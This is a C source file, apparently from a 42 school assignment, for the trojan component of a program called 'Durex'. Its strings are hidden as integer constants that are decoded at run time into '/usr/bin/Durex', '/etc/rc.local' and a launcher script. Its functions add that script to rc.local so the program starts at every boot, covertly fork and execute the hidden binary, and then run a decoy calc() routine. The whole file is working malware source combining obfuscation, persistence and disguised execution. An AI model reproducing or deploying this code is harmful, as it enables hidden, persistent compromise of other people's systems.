/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   trojan.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/12/03 10:35:03 by alagroy-          #+#    #+#             */
/*   Updated: 2021/12/09 13:10:09 by alagroy-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void        get_filename(int *buf)
{
    int     i;
    char    *filename;
    
    buf[0] = 0x73747630;
    buf[1] = 0x6f6a6330;
    buf[2] = 0x73764530;
    buf[3] = 0x7966;
    i = -1;
    filename = (char *)buf;
    while (filename[++i])
        filename[i]--;
}

static void get_rc(int *buf)
{
    int     i;
    char    *filename;
    
    buf[0] = 0x64756630;
    buf[1] = 0x2f647330;
    buf[2] = 0x6264706d;
    buf[3] = 0x6d;
    i = -1;
    filename = (char *)buf;
    while (filename[++i])
        filename[i]--;
}

static void make_command(int *buffer)
{
    int     i;
    char    *command;
    
    buffer[0] = 0x63302224;
    buffer[1] = 0x63306f6a;
    buffer[2] = 0x0b697462;
    buffer[3] = 0x6576740b;
    buffer[4] = 0x76302170;
    buffer[5] = 0x63307374;
    buffer[6] = 0x45306f6a;
    buffer[7] = 0x79667376;
    buffer[8] = 0x6a79660b;
    buffer[9] = 0x0b312175;
    i = -1;
    command = (char *)buffer;
    while (command[++i])
        command[i]--;
}

static int  should_i_persist(char *file)
{
    int     should_i;
    FILE    *rc;
    char    *line;
    size_t  size;

    if (access(file, F_OK))
        return (1);
    if (!(rc = fopen(file, "r")))
        return (0);
    should_i = 1;
    line = NULL;
    size = 0;
    while ((getline(&line, &size, rc) != -1) && should_i)
        if (strstr(line, "Durex") && (strstr(line, "Durex") - line) == 14)
            should_i = 0;
    fclose(rc);
    return (should_i);
}

static void persist(void)
{
    int     rc;
    char    file[20];
    char    command[50];

    bzero(command, 50);
    get_rc((int *)file);
    get_filename((int *)command);
    if (!should_i_persist(file))
        return ;
    if ((rc = open(file, O_WRONLY | O_CREAT | O_APPEND, 0755)) == -1)
        return ;
    make_command((int *)command);
    dprintf(rc, command);
    close(rc);
}

void        do_trojan_dirty_job(void)
{
    pid_t       pid;
    int         buf[4];
    char        *cmd[] = {
        (char *)buf,
        NULL
    };

    get_filename(buf);
    persist();
    if ((pid = fork()) == 0)
        execve(cmd[0], cmd, NULL);
    calc();
}